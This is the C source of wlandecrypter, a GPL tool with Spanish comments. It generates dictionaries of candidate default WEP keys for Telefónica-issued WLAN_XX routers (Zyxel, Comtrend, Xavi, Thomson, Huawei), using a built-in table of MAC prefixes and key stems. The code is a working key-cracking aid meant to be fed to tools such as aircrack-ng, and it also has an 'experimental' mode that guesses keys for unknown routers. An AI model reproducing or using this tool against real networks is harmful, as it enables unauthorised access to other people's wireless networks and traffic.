/*****************************************************************************
* Fichero:	wlandecrypter.c
* Autor:	Nilp0inteR (nilp0inter2k6[at]gmail[dot]com)
* Fecha:	23-03-2006  
* Actualizado:		22-11-2006 por nilp0inter
* 
* Modificado v0.6 :     15-12-2007 por *dudux    dudux[at]elhacker[dot]net
* Modificado v0.7 :     22-11-2008 por *dudux    dudu[at]seguridadwireless[dot]net
* Modificado v0.8 :     12-04-2009 por *dudux    dudu[at]seguridadwireless[dot]net
* Modificado v1.0 :     10-05-2009 por *dudux  // bea vuela muy alto...el cielo es nuestro niña
* Modificado v1.1 :		18-05-2009 por *dudux     Añadida funcion para ESSIDs cambiados 
* Modificado:           www.seguridadwireless.net    
* 
* Actualizado v1.2b:	18-11-2009 Niroz&NiñoMelon. Añadidas opciones '-l', '-e' y '-a'. Añade router Xavi E0:91:53.
* 									También se eliminó la constante MAXINDEX y el código relacionado con ella.
* 
* Actualizado v1.2:	08-12-2009 Niroz&NiñoMelon. Añadidas opciones '-l', '-e' y '-a'. Añade routers Comtrend, Xavi,
*											Thomson y Huawei.
* 											Se eliminó la constante MAXINDEX y el código relacionado con ella.
* 
* 
* Descripcion: Generador de diccionario de claves por defecto para los 
* routers de Timofonik Zyxel, Xavy, Comtrend, Thomson y Huawei.
*
* Este programa es software libre; puedes redistribuirlo y/o modificarlo
* bajo los terminos de la Licencia Publica General GNU (GPL) publicada
* por la Free Software Foundation; en su version numero 2, o (bajo tu 
* criterio) la ultima version. Mira http://www.fsf.org/copyleft/gpl.txt.
* 
* Este programa se distribuye SIN GARANTIA de ningun tipo. USALO bajo tu proio riesgo.
*
* Recomendaciones: wlandecrypter es multiplataforma, solo las ultimas versiones estan empaquetadas
*                  para  linux y  versiones de la Livecd WIFIWAY y WIFISLAX
*                  Hoy en dia estan para todo el mundo
*
*                 * Wlandecrypter 0.7 para  PDAs (Zaurus) gracias a burton de seguridadwireless 
*                 * Wlandecrypter 0.5 para Macintosh 
*                            --->http://wiki.adictolinux.org/index.php/Wlandecrypter_en_Mac_Os_X
*                 * Wlandecrypter 0.5 para windows no se nada,creo que nilp0inter compilo hasta la v0.5
*                 
* wlandecrypter 1.2 para windows y Macintosh en foro.seguridadwireless.net, o compila este mismo codigo.
* 
* Mira tambien:  wlaninject , wlandestroy , wepattack , weplab y aircrack-ng 
*                 
*****************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//
// Numero de modelos de routers en la base de datos
//
#define MAXROUTER 20	//para un máximo de 20 (aumentar si necesario) mac de routers, hay 18 conocidos de momento

#define VERSION 1
#define SUBVERSION 2
	
//
// Tipo de dato Router, con toda la informacion
//
typedef struct Router
{
	char bssid[18];		// cambiado de 9 a 11 a 15 a 16 ,17,18. almacenará -> xx:xx:xx:xx:xx:xx
	char init[8];		// almacena parte inicial fija de la clave
	char init1[8];		// añadido v0.7,creara otro indice para la structura Router,por lo que 
						// para tipo 00:13:49:XX:XX:XX y 00:1A:2B:XX:XX:XX habra un diccionario doble 
						// añadido v0.8 nuevo diccionario doble para 00:19:CB:XX:XX:XX
	
	char init2[8];		// añadido v1.2 para diccionario experimental #Niroz&Melon
	char init3[8];		// añadido v1.2 para diccionario experimental #Niroz&Melon
	char init4[8];		// añadido v1.2 para diccionario experimental #Niroz&Melon
	
	char notas[40];		// cambiado de 30 a 40  v1.2

} tRouter;

//
// Variables globales
//
char hex[16]="0123456789ABCDEF";


//
// Funciones
//
void initRouters(tRouter routers[MAXROUTER]);
void datosRouters(tRouter routers[MAXROUTER]);
void muestraAyuda();
int buscaBssid(tRouter routers[MAXROUTER], char *bssid);
void imprimeClaves(FILE *fichero, tRouter routers[MAXROUTER], int bssidId, char *keyEnd);
void essidCambiado(FILE *fichero, tRouter routers[MAXROUTER], int bssidId);  // v1.1

void listaRouters(tRouter routers[MAXROUTER]);				// #Niroz&NiñoMelon listado de routers conocidos v1.2
void datosRoutersExperimental(tRouter routers[MAXROUTER], char *bssid);	// #Niroz&NiñoMelon para router desconocido v1.2

void generaTodasClaves(FILE *fichero, tRouter routers[MAXROUTER], char *keyEnd); // #Niroz&NiñoMelon para todos los routers v1.2
int checkEndkey (char *arg2);	// #Niroz&NiñoMelon v1.2

//
// MAIN !!!
//
int main(int argc, char *argv[])
{
	int bssidId, i;
	int validHex=0;
	char endKey[2];
	tRouter routers[MAXROUTER];
	FILE *fichero;
	
	int opcionA = 0;
	
	initRouters(routers);
	datosRouters(routers);

//----------------------------------------------------------------- comprobacion opciones de entrada
	if(argc<2 || argc>5)
	{
		muestraAyuda();
		fprintf(stderr," [-Error] Numero de opciones de entrada invalido\n\n");
		return 1;
	}

	if (strcmp("-l", argv[1]) == 0){		//opcion -l #Niroz&Melon v1.2
							
		listaRouters(routers);			// muestra listado de routers conocidos
		return 0;
	}

	
	if(strlen(argv[1])!=17)  // 12 caracateres alfanumericos y los 5 puntos dobles
	{
		muestraAyuda();
		fprintf(stderr," [-Error] Longitud de BSSID invalida, formato xx:xx:xx:xx:xx:xx\n\n");
		return 1;
	}
		
	
	bssidId = buscaBssid(routers, argv[1]);


	if (argc == 4)			// #Niroz&Melon v1.2
	{
		if ( strcmp("-e", argv[3]) == 0 ){				// opcion -e ?
														
			datosRoutersExperimental(routers, argv[1]);	
			bssidId = 0;
		}

		if ( strcmp("-a", argv[3]) == 0 ){				// opcion -a ?
														
			opcionA = 1;
			bssidId = 0;
		}
	}


	if (argc == 5)			// #Niroz&Melon v1.2
	{
		if (strcmp("-e", argv[4]) != 0 && strcmp("-a", argv[4]) != 0){		// opcion -e o -a
									
			muestraAyuda();	
			fprintf(stderr," [-Error] Opcion %s desconocida\n\n", argv[4]);
			return 1;
		}
		else{
					
			if ( strcmp("-e", argv[3]) == 0 ){			// opcion -e puede estar como el argumento 4 o 5
														
				datosRoutersExperimental(routers, argv[1]);	
				bssidId = 0;
			}

			if ( strcmp("-a", argv[3]) == 0 ){			// opcion -a puede estar como el argumento 4 o 5
														
				opcionA = 1;
				bssidId = 0;
			}
		
			if ( strcmp("-e", argv[4]) == 0 && strcmp("-a", argv[3]) != 0 ){	// opcion -e puede estar como el argumento 4 o 5
												//solo se realiza la 1º opcion encontrada
				datosRoutersExperimental(routers, argv[1]);		// -e y -a no compatibles no se ejecutan en el mismo comando
				bssidId = 0;
			}

			if ( strcmp("-a", argv[4]) == 0 && strcmp("-e", argv[3]) != 0 ){	// opcion -a puede estar como el argumento 4 o 5
												//solo se realiza la 1º opcion encontrada
				opcionA = 1;	
				bssidId = 0;
			}
		}
	}	
	

	if(bssidId==-1) 
	{
		muestraAyuda();
		fprintf(stderr, " [-] BSSID no encontrado. Usa opcion -l para ver lista de routers conocidos.\n\n");
		return 1;
	}
	else
	{

		if(argc<3)
		{
			muestraAyuda();
			fprintf(stderr, " [-Error] ESSID: No especificado\n\n");
			return 1;
		}

		for(i=0;i<strlen(argv[2]);i++)
			argv[2][i]=toupper(argv[2][i]);		//convierte argv[2] ESSID a mayúsculas

								//comprueba que el essid empieza por "WLAN_"
		if(strlen(argv[2])!= 7 || strncmp("WLAN_", argv[2], 5) != 0 )
		{
			muestraAyuda();
			fprintf(stderr, " [-Error] ESSID: %s invalido!!\n\n", argv[2]);
			return 1;
		}
		else
		{
			
// ------------------------opcion -a -------------------------------- // #Niroz&Melon v1.2
			
			if (opcionA)
			{	
				if(argv[2][5]=='?' && argv[2][6] =='?')
				{
		
					endKey[0]=argv[2][5];
					endKey[1]=argv[2][6];
	
					fprintf(stderr," [+] ESSID: %s\n", argv[2]);

	
					if (strcmp("-a", argv[3]) != 0)
					  {
						fichero=fopen(argv[3], "a+");
						if(fichero!=NULL)
						  {
							generaTodasClaves(fichero, routers, endKey);
							fclose(fichero);
															
							fprintf(stderr, " [+] BSSID: %s\n", argv[1]);
							fprintf(stderr, " [+] Modelo: Todos los conocidos\n");
							fprintf(stderr, " [+] Fichero de claves: %s\n", argv[3]);
							fprintf(stderr, " [+] Fichero guardado OK\n");
						  } 
						  else {
							fprintf(stderr,"\n\n [-] Error al abrir o crear el fichero\n\n");
							return 1;
						  }
						}
						else { 		//si opcion -a en posicion del argumento 4 salida por pantalla v1.2
							fprintf(stderr," [+] Seleccionada salida estandar\n");
							generaTodasClaves(stdout, routers, endKey);
						}
	
				}  
				else 
				{
					if (checkEndkey(argv[2]))
					{
						
						endKey[0]=argv[2][5];
						endKey[1]=argv[2][6];	
						
						fprintf(stderr," [+] ESSID: %s\n", argv[2]);
						

						if (strcmp("-a", argv[3]) != 0)
						{ 
									
							fichero=fopen(argv[3], "a+");
							if(fichero!=NULL)
							{
								generaTodasClaves(fichero, routers, endKey);
							
								fclose(fichero);
									
								fprintf(stderr, " [+] BSSID: %s\n", argv[1]);
								fprintf(stderr, " [+] Modelo: Todos los conocidos\n");
								fprintf(stderr, " [+] Fichero de claves: %s\n", argv[3]);
								fprintf(stderr, " [+] Fichero guardado OK\n");
							}
							else {
								fprintf(stderr,"\n\n [-] Error al abrir o crear el fichero\n\n");
								return 1;
							}
							
						}
						else {			//si opcion -a en posicion del argumento 4 salida por pantalla v1.2
							fprintf(stderr," [+] Seleccionada salida estandar\n");
							generaTodasClaves(stdout, routers, endKey);
						}
						
					}
					else
					{
						muestraAyuda();
						fprintf(stderr, " [-] ESSID: %s invalido!! \n\n", argv[2]);
						return 1;
					}	
					
				}   
			  
			  return 0;
			}

// ------------------------ Fin opcion -a -------------------------------------------------			

//*************************************************************************************************
// essid cambiado WLAN_??   (idea de tupy de elhacker.net)
//************************************************************************************************* 
	if(argv[2][5]=='?' && argv[2][6] =='?')
	{
		fprintf(stderr," [+] ESSID: %s\n", argv[2]);

		if( argc>3 ) // Fichero
		{
			if (strcmp("-e", argv[3]) != 0)			//v1.2
			  {
				fichero=fopen(argv[3], "a+");
				if(fichero!=NULL)
				{
					essidCambiado(fichero,routers,bssidId);
					fclose(fichero);
                    fprintf(stderr, " [+] BSSID: %s\n", argv[1]);
					fprintf(stderr, " [+] Modelo: %s\n", routers[bssidId].notas);
					fprintf(stderr, " [+] Fichero de claves: %s\n", argv[3]);
					fprintf(stderr, " [+] Fichero guardado OK\n");
                } 
                else {
                    fprintf(stderr,"\n\n [-] Error al abrir o crear el fichero\n\n");
                    return 1;
                }
			 }
			 else { 		//si opcion -e en posicion del argumento 4 salida por pantalla v1.2
                   fprintf(stderr," [+] Seleccionada salida estandar\n");
                   essidCambiado(stdout,routers,bssidId);
			  }
						
		 }
		else {
		     fprintf(stderr," [+] Seleccionada salida estandar\n");
             essidCambiado(stdout,routers,bssidId);
		  }
			
         return 0 ; 
    }
//****************************************************************************************************
                    //comprueba que el primer caracter despues del "WLAN_Xx" es hexadecimal
			for(i=0;i<strlen(hex);i++)
			{
				if(argv[2][5]==hex[i])
				{
					validHex++;
					break;
				}
			}
			//comprueba que el segundo caracter despues del "WLAN_xX" es hexadecimal
			for(i=0;i<strlen(hex);i++)
			{
				if(argv[2][6]==hex[i])
				{
					validHex++;
					break;
				}
			}

			if(validHex!=2)
			{
				muestraAyuda();
				fprintf(stderr, " [-] ESSID: %s invalido!! \n\n", argv[2]);
				return 1;
			}
			else
			{
				endKey[0]=argv[2][5];
				endKey[1]=argv[2][6];

				fprintf(stderr," [+] ESSID: %s\n", argv[2]);


				if( argc>3 ) // Fichero
				{

					if (strcmp("-e", argv[3]) != 0)		//v1.2
					{ 
						
						fichero=fopen(argv[3], "a+");
						if(fichero!=NULL)
						{
							imprimeClaves(fichero,routers,bssidId,endKey);
							fclose(fichero);
						
							fprintf(stderr, " [+] BSSID: %s\n", argv[1]);
							fprintf(stderr, " [+] Modelo: %s\n", routers[bssidId].notas);
							fprintf(stderr, " [+] Fichero de claves: %s\n", argv[3]);
							fprintf(stderr, " [+] Fichero guardado OK\n");
						}
						else {
							fprintf(stderr,"\n\n [-] Error al abrir o crear el fichero\n\n");
							return 1;
						}
				
					}
					else {			//si opcion -e en posicion del argumento 4 salida por pantalla v1.2
						fprintf(stderr," [+] Seleccionada salida estandar\n");
						imprimeClaves(stdout,routers,bssidId,endKey);
					}
			
				}
				else {
				
					fprintf(stderr," [+] Seleccionada salida estandar\n");
					imprimeClaves(stdout,routers,bssidId,endKey);
				}
			}
		}

	}
		
	return 0;
}	

//-------------------------------------------------------------FIN main

// Vacia la estructura routers
//
void initRouters(tRouter routers[MAXROUTER])
{
	int j;
	for(j=0;j<MAXROUTER;j++)
	{
		strcpy(routers[j].bssid,"");
		strcpy(routers[j].init,"");
		strcpy(routers[j].init1,"");
		strcpy(routers[j].init2,"");	//v1.2
		strcpy(routers[j].init3,"");	//v1.2
		strcpy(routers[j].init4,"");	//v1.2
		strcpy(routers[j].notas,"");
	}
}

//
// Introduce los datos de los modelos conocidos
//
void datosRouters(tRouter routers[MAXROUTER])
{

	// Z-com
	strcpy(routers[0].bssid,"00:60:B3\0");
	strcpy(routers[0].init,"Z001349\0");
	strcpy(routers[0].notas,"Z-com\0");

	// Xavvy
	strcpy(routers[1].bssid,"00:01:38\0");
	strcpy(routers[1].init,"X000138\0");
	strcpy(routers[1].notas,"Xavi 7768r\0");

	// Comtrend
	strcpy(routers[2].bssid,"00:03:C9\0");
	strcpy(routers[2].init,"C0030DA\0");
	strcpy(routers[2].notas,"Comtrend 535\0");

	
	// Zyxel : Gracias a thefkboss de foro.elhacker.net por esta observacion
	strcpy(routers[3].bssid,"00:A0:C5\0"); 
	strcpy(routers[3].init,"Z001349\0");
	strcpy(routers[3].notas,"Zyxel 650HW/660HW\0");

	// Comtrend NUEVO, gracias a dnreinad por el coche xD
	strcpy(routers[4].bssid,"00:16:38\0");
	strcpy(routers[4].init,"C0030DA\0");
	strcpy(routers[4].notas,"Comtrend_536+\0");

	// P-660HW-D1,gracias a Tertulia de foro.elhacker.net  ;)
	strcpy(routers[5].bssid,"00:13:49\0");
	strcpy(routers[5].init,"Z001349\0");
    strcpy(routers[5].init1,"Z0002CF\0"); //añadido v0.7 ....
	strcpy(routers[5].notas,"Zyxel_P-660HW-D1\0");


        //  ZyGate Communications
        strcpy(routers[6].bssid,"00:02:CF\0");
        strcpy(routers[6].init,"Z0002CF\0");
        strcpy(routers[6].init1,"Z0023F8\0");  // añadida v1.0  gracias a thedoctor77 ;)
        strcpy(routers[6].notas,"ZyGate\0");

        // Comtrend  nuevos 2007-2008  *dudux y dnreinad 
        strcpy(routers[7].bssid,"00:1A:2B\0");
        strcpy(routers[7].init,"C0030DA\0"); 
        strcpy(routers[7].init1,"C001D20\0"); //añadido v0.7 ....
        strcpy(routers[7].notas,"Comtrend_DSL\0");      

        // Zygate v06. gracias pianista y Sycho por estar atento
        strcpy(routers[8].bssid,"00:19:CB\0");   
        strcpy(routers[8].init,"Z0002CF\0");
        strcpy(routers[8].init1,"Z0019CB\0"); // añadido v0.8 (2009) Zyxel FTTH (fibra optica hasta el hogar) 
        strcpy(routers[8].notas,"Zyxel_660hw_FTTH\0");  // gracias Sycho :P

        // Comtrend hrodgar v0.6
        strcpy(routers[9].bssid,"00:19:15\0");
        strcpy(routers[9].init,"C0030DA\0");
        strcpy(routers[9].notas,"Comtrend_2008\0");

        // Nuevos version0.7
        // Comtrend 2008 Mugen de el foro.elhacker.net  ;)
        strcpy(routers[10].bssid,"00:30:DA\0");
        strcpy(routers[10].init,"C0030DA\0");
        strcpy(routers[10].notas,"Comtrend_536+\0");

        // Comtrend nuevos 2008 
        strcpy(routers[11].bssid,"00:1D:20\0");
        strcpy(routers[11].init,"C001D20\0");
        strcpy(routers[11].notas,"Comtrend_536+\0"); 

        //Nuevo version0.9
        // Zyxel P660HW-D1  2009 Gracias a Zim_Zum y a buckynet de seguridadwireless.net
        strcpy(routers[12].bssid,"00:23:F8\0");
        strcpy(routers[12].init,"Z0023F8\0");
        strcpy(routers[12].notas,"Zyxel_P660HW-D1\0");  
 
        // Nuevo version1.0
        // Xavy  2009   zim_zum y *dudux
        strcpy(routers[13].bssid,"00:01:36\0");
        strcpy(routers[13].init,"X000138\0");
        strcpy(routers[13].notas,"Xavi_7768r_2009\0");
		
		
	// *dudux v1.2
	// Comtrend 2009
	strcpy(routers[14].bssid,"00:03:DA\0");
	strcpy(routers[14].init,"C0030DA\0");
	strcpy(routers[14].notas,"Comtrend_2009\0");
		
	// *dudux v1.2
	// Thomsom 2009
	strcpy(routers[15].bssid,"00:1F:9F\0");
	strcpy(routers[15].init,"T5YF69A\0");
	strcpy(routers[15].notas,"Thomsom_2009\0");
		
	// Niroz&Melon v1.2
	// Xavi 7968. Solos 4610 RD / Solos 461x
	strcpy(routers[16].bssid,"E0:91:53\0");
	strcpy(routers[16].init,"XE09153\0");
	strcpy(routers[16].notas,"Xavi_7968-Solos_4610_RD_/_461x\0");
	
	// Ferlan v1.2
	// Huawei EchoLife HG520v FTTH (Fibra optica)
	strcpy(routers[17].bssid,"00:18:02\0");
	strcpy(routers[17].init,"H4A69BA\0");
	strcpy(routers[17].init1,"H538FBF\0");
	strcpy(routers[17].notas,"Huawei_EchoLife_HG520v\0");
}

//
// Muestra la ayuda del programa
//
void muestraAyuda()
{
	fprintf(stderr, "\nwlandecrypter v%i.%i -   2009 Niroz&Melon\n", VERSION, SUBVERSION);
	fprintf(stderr, "                       2009..2007 dudu[at]seguridadwireless.net\n");
	fprintf(stderr, "                       2006 nilp0inter2k6_at_gmail.com\n\n");
	fprintf(stderr, "");
	fprintf(stderr, " ------------>  http://www.seguridadwireless.net <------------\n\n\n");
	fprintf(stderr, "");
	fprintf(stderr, "   uso: wlandecrypter [-l] <bssid> <essid> [output_file opcion]\n\n\n");
	fprintf(stderr, "");
	fprintf(stderr, "       -l : lista en pantalla todos los routers conocidos.\n\n");
	fprintf(stderr, "");
	fprintf(stderr, " opcion:\n\n");
	fprintf(stderr, "       -e : genera diccionario experimental para routers desconocidos.\n");
	fprintf(stderr, "       -a : genera diccionario para todos los routers conocidos y una WLAN_XX.\n\n\n");
	fprintf(stderr, "");
	fprintf(stderr, "  <essid> = WLAN_??, para crear diccionario con todas las posibilidades.\n\n\n");
}

//
// Busca el bssid en la estructura y devuelve el identificador o -1 si no existe
//
int buscaBssid(tRouter routers[MAXROUTER], char *bssid)
{
	int i;
	
	for(i=0;i<strlen(bssid);i++)
		bssid[i]=toupper(bssid[i]);

	for(i=0;i<MAXROUTER;i++)
	{
		if(strncmp ( routers[i].bssid, bssid, 8 ) == 0)
			return i;
	}
	
	return -1;
}

//
// Imprime las claves en un fichero 
//
void imprimeClaves(FILE *fichero, tRouter routers[MAXROUTER], int bssidId, char *keyEnd)
{
	int i,j,k,l;
 	
                 // Hay gente que se asusta con estos 4 for anidados  ;)
	for(i=0;i<16;i++)  // 16 digitos hexadecimales, combinaciones de 0000 a FFFF
		for(j=0;j<16;j++)
			for(k=0;k<16;k++)
				for(l=0;l<16;l++)
					{

						fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init,hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
						
						//añadida este bucle v0.7 para crear un diccionario con las 2 cabeceras posibles
						if(strlen(routers[bssidId].init1)!=0)
						{
						fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init1,hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
						}
						
						if(strlen(routers[bssidId].init2)!=0)	//v1.2
						
							fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init2,hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
							
						if(strlen(routers[bssidId].init3)!=0)	//v1.2
						
							fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init3,hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
							
						if(strlen(routers[bssidId].init4)!=0)	//v1.2
						
							fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init4,hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
						
						
					}

}

// Funcion para cuando se conserva la key por defecto pero el essid ha cambiado   ejem: WLAN_MARTINEZ  00:01:38:XX:XX:XX
// generara desde WLAN_00 a WLAN_FF todas las keys en un mismo fichero,ocupa 225 MB  aproximadamente y tarda unos 15 minutos 
// en desencriptar, esta funcion me la paso tupy ,que fue quien indago en ella.

// Con la opcion -e activada el fichero ocupa unos 672 MB en disco //v1.2

void essidCambiado(FILE *fichero, tRouter routers[MAXROUTER], int bssidId)
{
	int i,j,k,l,m,n;
 	
                 // Hay gente que se asusta con estos 4 (ahora 6) for anidados  ;)
	for(i=0;i<16;i++)  // 16 digitos hexadecimales, combinaciones de 000000 a FFFFFF
		for(j=0;j<16;j++)
			for(k=0;k<16;k++)
				for(l=0;l<16;l++)
					for(m=0;m<16;m++)
						for(n=0;n<16;n++) //AQUI ESTA MI MODIFICACION
	                       {
	                		fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init,hex[i],hex[j],hex[k],hex[l],hex[m],hex[n]);
	                                	
                                           //añadida este bucle v0.7 para crear un diccionario con las 2 cabeceras posibles
							if(strlen(routers[bssidId].init1)!=0)
								{
								fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init1,hex[i],hex[j],hex[k],hex[l],hex[m],hex[n]);

								}		
							
							if(strlen(routers[bssidId].init2)!=0)	//v1.2
								
								fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init2,hex[i],hex[j],hex[k],hex[l],hex[m],hex[n]);
								
							if(strlen(routers[bssidId].init3)!=0)	//v1.2
								
								fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init3,hex[i],hex[j],hex[k],hex[l],hex[m],hex[n]);
								
							if(strlen(routers[bssidId].init4)!=0)	//v1.2
								
								fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init4,hex[i],hex[j],hex[k],hex[l],hex[m],hex[n]);

						  }

}

//----------------------------------------------------------------------------------------------------------------

void listaRouters(tRouter routers[MAXROUTER]){		//lista en pantalla todos los routers conocidos #Niroz&Melon v1.2
	int i;

	i = 0;
	
	fprintf(stderr, "\n");
	
	while (strcmp ("", routers[i].bssid) != 0){
		
		fprintf(stderr, " Essid: %s ", routers[i].bssid);
		fprintf(stderr, " -- Router-Modelo: %s\n\n", routers[i].notas);
		i++;
	}
}

//------------------------------------------------------------------------------------------------------------------	
// opcion -e: Funcion experimental. Ya que en algunos de los ultimos routers las claves siguen el patron X112233xxxxAB
// para por ejemplo un router Xavi con mac 11:22:33:xx:xx:xx y WLAN_AB, e igual en algunos Comtrend, Zyxel, etc, porque
// no probar y ver que pasa con otros que puedan aparecer y no esten aun en la lista. Asi paso con el Xavi E0:91:53 ;)

void datosRoutersExperimental(tRouter routers[MAXROUTER], char *bssid){			// #Niroz&Melon v1.2

	int i,j;
	char partefija1[8]="xxxxxxx\0";
	char partefija2[8]="xxxxxxx\0";
	char partefija3[8]="xxxxxxx\0";
	char partefija4[8]="xxxxxxx\0";
	char partefija5[8]="xxxxxxx\0";
	
	j = 1;
	
	for(i=0; i < strlen(bssid); i++)		//convierte a mayusculas
		bssid[i] = toupper(bssid[i]);
	

	strncpy(routers[0].bssid, bssid, 8); 
	routers[0].bssid[8]='\0';
	
	
	for (i=0; i < 8; i++)
		
		if ( bssid[i] != ':'){			// elimina los ':' de la mac
					
			partefija1[j] = bssid[i];
			partefija2[j] = bssid[i];
			partefija3[j] = bssid[i];
			partefija4[j] = bssid[i];
			partefija5[j] = bssid[i];
			j++;
		}	

	partefija1[0] = 'C';		// posible router Comtrend
	partefija2[0] = 'X';		// posible router Xavy
	partefija3[0] = 'Z';		// posible router ZyGate, Zyxel, Z-Com
	partefija4[0] = 'T';		// posible router Thomson
	partefija5[0] = 'H';		// posible router Huawei
			
	strcpy(routers[0].init,partefija1);
	strcpy(routers[0].init1,partefija2);
	strcpy(routers[0].init2,partefija3);
	strcpy(routers[0].init3,partefija4);
	strcpy(routers[0].init4,partefija5);
	strcpy(routers[0].notas,"Desconocido");

}
//----------------------------------------------------------------------------------------------------------------
//OpciOn -a: genera las claves de un WLAN_XX para todos los routers conocidos sin tener en cuenta la
//			 bssid introducida. Ejemplo, puede servir para un router no conocido, distinto a los entregados
//			 por el operador, pero en el que se haya mantenido la configuraciOn del original.

void generaTodasClaves(FILE *fichero, tRouter routers[MAXROUTER], char *keyEnd){	// #Niroz&Melon v1.2 (27/11/2009)
	int x;
	int i,j,k,l,m,n;
	
	x = 0;


 if(keyEnd[0]=='?' && keyEnd[1] =='?')
 {
	while (strcmp ("", routers[x].bssid) != 0)
	{

		for(i=0;i<16;i++)  // 16 digitos hexadecimales, combinaciones de 000000 a FFFFFF
		  for(j=0;j<16;j++)
			for(k=0;k<16;k++)
				for(l=0;l<16;l++)
					for(m=0;m<16;m++)
						for(n=0;n<16;n++) 
	                       {
	                		fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[x].init,hex[i],hex[j],hex[k],hex[l],hex[m],hex[n]);
	                                	
                                          
							if(strlen(routers[x].init1)!=0)

								fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[x].init1,hex[i],hex[j],hex[k],hex[l],hex[m],hex[n]);
							
							if(strlen(routers[x].init2)!=0)	//v1.2
								
								fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[x].init2,hex[i],hex[j],hex[k],hex[l],hex[m],hex[n]);
								
							if(strlen(routers[x].init3)!=0)	//v1.2
								
								fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[x].init3,hex[i],hex[j],hex[k],hex[l],hex[m],hex[n]);
								
							if(strlen(routers[x].init4)!=0)	//v1.2
								
								fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[x].init4,hex[i],hex[j],hex[k],hex[l],hex[m],hex[n]);

						  }
		x++;
	} 
 }	
 else {
	while (strcmp ("", routers[x].bssid) != 0)
	{
		for(i=0;i<16;i++)  // 16 digitos hexadecimales, combinaciones de 0000 a FFFF
			for(j=0;j<16;j++)
				for(k=0;k<16;k++)
					for(l=0;l<16;l++)
					{
						fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[x].init,hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
						
						
						if(strlen(routers[x].init1)!=0)

							fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[x].init1,hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
						
						if(strlen(routers[x].init2)!=0)	//v1.2
						
							fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[x].init2,hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
							
						if(strlen(routers[x].init3)!=0)	//v1.2
						
							fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[x].init3,hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
							
						if(strlen(routers[x].init4)!=0)	//v1.2
						
							fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[x].init4,hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
					}
		x++;
	} 
 }

}
//------------------------------------------------------------------------------------------
// comprueba que primer y segundo caracter despues del "WLAN_" son hexadecimales

int checkEndkey (char *argv2){			// #Niroz&Melon v1.2
	
	int i,validHex=0;
	
	for(i=0; i<strlen(hex) ;i++)		//comprueba primer caracter
		{
			if(argv2[5]==hex[i])
			{
				validHex++;
				break;
			}
		}
			
	for(i=0; i<strlen(hex) ;i++)		//comprueba segundo caracter
		{
			if(argv2[6]==hex[i])
			{
				validHex++;
				break;
			}
		}

	if(validHex != 2)
		
		return 0;		// mal
	
		else return 1;	// bien 
}
//---------------------------------------------------------------------------------- EOF
